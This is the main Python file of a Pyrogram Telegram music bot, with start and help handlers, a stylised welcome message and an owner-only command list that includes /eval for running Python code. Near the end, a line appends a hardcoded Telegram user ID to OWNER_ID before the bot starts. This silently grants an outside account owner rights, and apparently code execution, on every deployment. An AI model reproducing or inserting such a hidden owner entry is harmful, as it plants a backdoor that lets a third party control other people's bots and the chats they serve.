from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
👋 𝗛𝗲𝗹𝗹𝗼 [{}](tg://user?id={}),

\n\n🎸𝙄 𝙖𝙢 [𝙆𝙖𝙫𝙚𝙚𝙨𝙝𝙖'𝙨 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 𝙈𝙪𝙨𝙞𝙘 𝙋𝙡𝙖𝙮 𝘽𝙤𝙩 🎶](https://telegra.ph/file/acf5163b7255b79fca645.jpg)

⚙️ 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙡𝙮 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙙 𝘽𝙮 [𝙆𝙖𝙫𝙚𝙚𝙨𝙝𝙖 𝙉𝙚𝙩𝙝𝙢𝙖𝙡](https://t.me/jason_spqr_roman_Kr) ⚙️

𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 𝙉𝙖𝙢𝙚 𝙤𝙛 𝙩𝙝𝙚 𝙎𝙤𝙣𝙜 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩... 🎶🎶

𝐄𝐠. ```/song Faded```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="👥 Oғғɪᴄɪᴀʟ Sᴜᴘᴘᴏʀᴛ Gʀᴏᴜᴘ", url="https://t.me/Kaveesha_bot_Support"),
             InlineKeyboardButton(
                        text="➕ Aᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴘ ➕", url="https://t.me/Kaveesha_Music_play_Bot?startgroup=true"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 𝙉𝙖𝙢𝙚 𝙤𝙛 𝙩𝙝𝙚 𝙎𝙤𝙣𝙜 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩... 🎶🎶\n /song (song name) 🥳"
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("𝙆𝙖𝙫𝙚𝙚𝙨𝙝𝙖'𝙨 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 𝙈𝙪𝙨𝙞𝙘 𝙋𝙡𝙖𝙮 𝘽𝙤𝙩 Is Now Working🤗🤗🤗")
idle()
